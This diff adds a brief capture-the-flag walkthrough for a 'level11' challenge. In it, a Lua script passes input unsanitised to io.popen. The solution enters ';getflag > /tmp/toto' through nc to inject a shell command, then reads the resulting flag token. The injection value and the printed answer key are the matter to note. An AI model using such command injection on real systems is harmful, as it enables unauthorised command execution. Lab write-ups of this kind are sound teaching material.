@@ -1,0 +1,20 @@
+In your home, you have level11, a lua file
+
+In this file, we can see a function hash that use io.popen function
+
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+See io.popen docmentation here.
+
+io.popen (prog [, mode])
+Starts program prog in a separated process and returns a file handle that you can use to read data from this program (if mode is "r", the default) or to write data to this program (if mode is "w").
+
+After logging:
+nc localhost 5151
+
+The password is:
+;getflag > /tmp/toto
+
+Get the token:
+cat /tmp/toto
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
